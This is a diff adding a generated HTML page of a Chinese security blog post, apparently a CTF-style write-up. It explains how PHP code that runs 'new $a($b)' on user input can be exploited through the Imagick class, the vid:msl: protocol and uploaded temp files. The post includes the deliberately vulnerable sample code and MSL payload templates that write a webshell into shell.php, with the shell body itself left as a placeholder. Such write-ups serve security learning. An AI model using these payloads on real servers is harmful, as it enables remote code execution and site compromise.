@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="阿巴">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/12/08/利用imagick进行文件上传/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="利用imagick写马如下题目： class App &amp;#123;     function __construct ($cmd) &amp;#123;         system($cmd);     &amp;#125; &amp;#125;  class App2 &amp;#123;     function App2 ($cmd) &amp;#123;         system($cmd);     &amp;#125; &amp;#1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="阿巴">
+<meta property="og:url" content="http://example.com/2023/12/08/%E5%88%A9%E7%94%A8imagick%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="阿巴">
+<meta property="og:description" content="利用imagick写马如下题目： class App &amp;#123;     function __construct ($cmd) &amp;#123;         system($cmd);     &amp;#125; &amp;#125;  class App2 &amp;#123;     function App2 ($cmd) &amp;#123;         system($cmd);     &amp;#125; &amp;#1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/source/images/%E5%88%A9%E7%94%A8imagick%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/%E8%87%AA%E5%8A%A8%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0.png">
+<meta property="og:image" content="d:/Git/blog/myblog/source/images/imagick.png">
+<meta property="og:image" content="http://example.com/source/images/%E5%88%A9%E7%94%A8imagick%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/%E5%AE%9E%E4%BE%8B%E4%B8%80.png">
+<meta property="og:image" content="http://example.com/source/images/%E5%88%A9%E7%94%A8imagick%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/%E5%AE%9E%E4%BE%8B%E4%BA%8C.png">
+<meta property="article:published_time" content="2023-12-08T06:45:23.611Z">
+<meta property="article:modified_time" content="2023-11-19T05:57:49.554Z">
+<meta property="article:author" content="阿巴">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/source/images/%E5%88%A9%E7%94%A8imagick%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/%E8%87%AA%E5%8A%A8%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/8d.png@1256w_1256h_!web-article-pic.webp" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/8d.png@1256w_1256h_!web-article-pic.webp">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/8d.png@1256w_1256h_!web-article-pic.webp">
+    <!--- Page Info-->
+    
+    <title>
+        
+        阿巴
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/e6d1c777bb54674dd5cc6ed2c6147596a899ed7b.jpg@1256w_708h_!web-article-pic.webp","dark":"/images/688bff5fab134b2da7d52ca53163372d39812ec8.jpg@1256w_708h_!web-article-pic.webp"},"title":"阿巴的小站","subtitle":{"text":[],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/621779","instagram":"https://www.instagram.com/","zhihu":"https://www.zhihu.com/people/zhi-chu-85-7","twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.2.2","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"如果讨厌当前的处境，那就不惜一切代价上去，然后去追随梦想吧！","links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/12/11  12：00：00"};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                阿巴
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                
+                  <h1 class="article-title-regular"></h1>
+                
+              </div>
+              
+                     
+            
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/49871906.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">阿巴</span>
+                            
+                                <span class="author-label">Lv4</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-12-08 14:45:23</span>
+        <span class="mobile">2023-12-08 14:45:23</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-11-19 13:57:49</span>
+            <span class="mobile">2023-11-19 13:57:49</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h1 id="利用imagick写马"><a href="#利用imagick写马" class="headerlink" title="利用imagick写马"></a>利用imagick写马</h1><p>如下题目：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">App</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">App2</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">App2</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment"># Vulnerable code</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">new</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在这段代码中，我们可以将a设置为App1或者2，将b设置为要执行的命令，便可以进行命令执行，但假设在其中没有像App1和2那样的可利用类的化，那就需要考虑其他的类，这个时候可以看自动加载函数，在 PHP 中，自动加载函数是一种特殊的函数，它可以在使用未定义的类时动态加载类文件。当你在 PHP 代码中使用一个尚未被定义的类时，PHP 会自动触发自动加载函数来查找并加载相应的类文件，以便能够使用这个类。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../source/images/%E5%88%A9%E7%94%A8imagick%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/%E8%87%AA%E5%8A%A8%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0.png"
+                     
+                ></p>
+<p>​																							  <em>php文档：<a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.autoload.php" >PHP: 类的自动加载 - Manual <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></em></p>
+<p>可以有以下几种方</p>
+<p><strong>利用内置类</strong></p>
+<p>通过内置类我们可以进行rce，常见的可以利用的内置类有：</p>
+<ul>
+<li>Error </li>
+<li>Exception </li>
+<li>SoapClient </li>
+<li>DirectoryIterator</li>
+<li>SimpleXMLElement </li>
+<li>SplFileObject</li>
+</ul>
+<p>我们可以用<code>var_dump(get_declared_classes());</code>这段，来列出可用的内置类；下面着重介绍Imagick扩展的利用。</p>
+<h4 id="imagick简介"><a href="#imagick简介" class="headerlink" title="imagick简介"></a>imagick简介</h4><p>Imagick 是一个用于在 PHP 中操作图像的扩展库。它基于 ImageMagick 库，提供了丰富的图像处理功能，包括图像格式转换、大小调整、滤镜应用、图像合并等等。</p>
+<p>使用 Imagick，你可以通过简单的 PHP 代码实现复杂的图像操作。它支持常见的图像格式，如 JPEG、PNG、GIF、TIFF，还支持一些额外的格式，如 PDF、SVG。</p>
+<p>Imagick 库提供了一系列的类和方法，使你可以轻松地加载、<strong>保存</strong>和处理图像。你可以利用这些方法执行图像的基本操作，如旋转、裁剪、缩放、模糊和锐化等。此外，你还可以应用滤镜和效果，如灰度、反转、色彩调整和边缘检测。</p>
+<p>Imagick 扩展实现了多个类，包括 Imagick 类。它的构造函数只有一个参数，可以是字符串或字符串数组：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="D:/Git/blog/myblog/source/images/imagick.png"
+                     
+                ></p>
+<p>​                                        												    <em><strong>文档：<a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.imagick.php" >PHP: Imagick - Manual <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></em></p>
+<h4 id="VID协议"><a href="#VID协议" class="headerlink" title="VID协议"></a>VID协议</h4><p>VID 实际上是 ImageMagick 中包裹一个文件或协议的一种方法。例如，如果您想在单个文件中访问一个目录中的所有图片，则可以使用 VID 协议来表示该操作，并使用通配符指示 ImageMagick 在目录中查找所有文件。</p>
+<p>需要注意的是 VID 协议仅适用于指示 ImageMagick 如何处理文件和协议。它并不是一个独立的协议，它不能单独使用而必须与另一个协议或文件名一起使用。</p>
+<p>使用 VID 协议的常见目的是为了筛选一批文件，以便选择一个或多个文件进行处理。在 PHP 中，上传的文件由临时文件名表示，通常是以 “php” 开头，后跟随机字符串的形式生成。使用 VID 协议可以通过通配符选择符合条件的文件，例如 <code>vid:msl:/tmp/php*</code> 表示选择 <code>/tmp</code> 目录下以 “php” 开头的文件。</p>
+<p>除了通配符之外，VID 协议还支持其他参数。下面是一个使用 VID 协议和其他参数的示例：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">// 使用 Vid 协议来获取 /tmp 目录下的所有 GIF 图片的第一帧</span>
+<span class="token variable">$firstFrame</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'vid:gif:/tmp/*.gif[0]'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在上面的示例中，我们使用 VID 协议表示获取 &#x2F;tmp 目录下所有 GIF 图像的第一帧。<code>[0]</code> 表示选取序列中的第一个图像帧，并使用 GIF 协议指示 ImageMagick 选择 GIF 图像。</p>
+<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>通过前面对vid的利用，我们可以让Imagick加载PHP上传的临时文件，而文件内容是完全可控的，那么我们就可以在其中构造恶意msl脚本，执行我们需要的逻辑。  前面我也说了，其实恶意msl脚本的核心就是<read>和<write>这两个标签。通过<read>可以读取一个图片，图片可以来自于远程http，也可以来自于本地；通过<write>可以将前面获取的图片写入到另一个位置，而且文件名可控。  那么，我们就可以通过如下一个msl文件来从Web服务器下载图片并写入到shell.php这个文件中： </p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; 
+&lt;image&gt;   
+&lt;read filename&#x3D;&quot;hxxps:&#x2F;&#x2F;placehold.co&#x2F;100.png&quot;&#x2F;&gt;   	 
+&lt;write filename&#x3D;&quot;shell.php&quot; &#x2F;&gt; 
+&lt;&#x2F;image&gt;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但是ImageMagick在处理图片后，会导致丢失原始图片中的信息，所以使用图片马是无法成功写入Webshell的。  要解决这个问题也很简单，既然MSL是一门图片处理语言，我们就可以找找是否有方法在图片中增加一些“注释”。msl有一个<comment>标签可以给生成的图片加注释，所以我们将Webshell编码后放在这个标签里即可：</p>
+<pre class="line-numbers language-msl" data-language="msl"><code class="language-msl">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;image&gt;
+  &lt;read filename&#x3D;&quot;hxxps:&#x2F;&#x2F;placehold.co&#x2F;100.png&quot;&#x2F;&gt;
+  &lt;comment&gt;HTML实体编码后的Webshell&lt;&#x2F;comment&gt;
+  &lt;write filename&#x3D;&quot;shell.php&quot; &#x2F;&gt;
+&lt;&#x2F;image&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发送数据包如图1，成功写入shell.php文件在当前目录，访问可见phpinfo()已解析，</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../source/images/%E5%88%A9%E7%94%A8imagick%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/%E5%AE%9E%E4%BE%8B%E4%B8%80.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../source/images/%E5%88%A9%E7%94%A8imagick%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/%E5%AE%9E%E4%BE%8B%E4%BA%8C.png"
+                     
+                ></p>
+<p> 如果服务器不能联网，我们可以找一些本地图片文件做处理，比如安装ImageMagick后自带的图片“&#x2F;usr&#x2F;share&#x2F;doc&#x2F;ImageMagick-7&#x2F;www&#x2F;wand.png”：  </p>
+<pre class="line-numbers language-msl" data-language="msl"><code class="language-msl">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; 
+&lt;image&gt; 
+&lt;read filename&#x3D;&quot;&#x2F;usr&#x2F;share&#x2F;doc&#x2F;ImageMagick-7&#x2F;www&#x2F;wand.png&quot;&#x2F;&gt;
+&lt;comment&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>HTML实体编码后的Webshell:</p>
+<pre class="line-numbers language-msl" data-language="msl"><code class="language-msl">&lt;&#x2F;comment&gt; 
+&lt;write filename&#x3D;&quot;shell.php&quot; &#x2F;&gt; 
+&lt;&#x2F;image&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>参考文章：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-web/php-tricks-esp/php-rce-abusing-object-creation-new-usd_get-a-usd_get-b" >https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-web/php-tricks-esp/php-rce-abusing-object-creation-new-usd_get-a-usd_get-b <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/" >Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM (ptsecurity.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> </li>
+        <li><strong>Author:</strong> 阿巴</li>
+        <li><strong>Created at:</strong> 2023-12-08 14:45:23</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2023-11-19 13:57:49
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2023/12/08/利用imagick进行文件上传/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2023/12/08/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item"></span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/12/08/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item"></span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title"></div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8imagick%E5%86%99%E9%A9%AC"><span class="nav-text">利用imagick写马</span></a></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>Invalid date</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">阿巴</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.2.2</a>
+        </div>
+        
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
